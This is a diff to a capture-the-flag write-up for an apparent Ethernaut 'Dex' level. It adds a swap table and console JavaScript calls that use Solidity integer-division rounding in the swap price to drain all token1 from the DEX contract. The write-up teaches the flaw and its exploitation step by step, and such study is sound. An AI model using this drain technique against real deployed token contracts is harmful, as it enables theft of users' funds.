@@ -97,7 +97,7 @@ The `SwappableToken` contract is an ERC20 token that can be swapped on the DEX.
 
 In solidity, mathematical processes are between integers values so the result of this process must be an integer. That's why, it doesn't get fractions. For example, `5 / 2 = 2` in solidity. 
 
-When we look at the contract, it divides the `getSwapPrice()` function. In other words, there are potential issues we will abuse them. We're going to swap all of our token1 for token2. Then swap all our token2 to obtain token1, then swap all our token1 for token2 and continue. Here's how the price history and balances would go.
+When we look at the contract, it divides the `getSwapPrice()` function. In other words, there are potential issues we will abuse them. We're going to swap all of our token1 for token2. Then swap all our token2 to obtain token1, then swap all our token1 for token2 and continue.
 
 ```
       DEX       |      player  
@@ -141,10 +141,23 @@ token1 - token2 | token1 - token2
   110     45    |   0       65 
 ```
 
-At this point,
+At this point, at the last swap above we've gotten hold of 65 token2, which is more than enough to drain all of 110 token1! By simple calculation, only 45 of token2 is required to get all 110 of token1.
+
+```
+      DEX       |     player  
+token1 - token2 | token1 - token2
+----------------------------------
+  100     100   |   10      10
+  110     90    |   0       20    
+  86      110   |   24      0    
+  110     80    |   0       30    
+  69      110   |   41      0    
+  110     45    |   0       65   
+  0       90    |   110     20
+```
 
 
-Gets address of tokens.
+Get the token addresses.
 
 ```js
 var token1 = await contract.token1()
@@ -196,6 +209,14 @@ words
 Object
 ```
 
+Check the contract's balance in token1. 
+
+```js
+await contract.balanceOf(token1, instance).then(x => x.toString())
+
+'100'
+```
+
 To exploit this, we should approve to the target contract while this swapping process.
 
 ```js
@@ -213,8 +234,10 @@ await contract.swap(token1, token2, 41)
 await contract.swap(token2, token1, 45)
 ```
 
+Finally, check the contract's balance in token1. As you see, we drain all token1 in the dex contract!
+
 ```js
-await contract.balanceOf(token1, instance).then(v => v.toString())
+await contract.balanceOf(token1, instance).then(x => x.toString())
 
 '0'
 ```
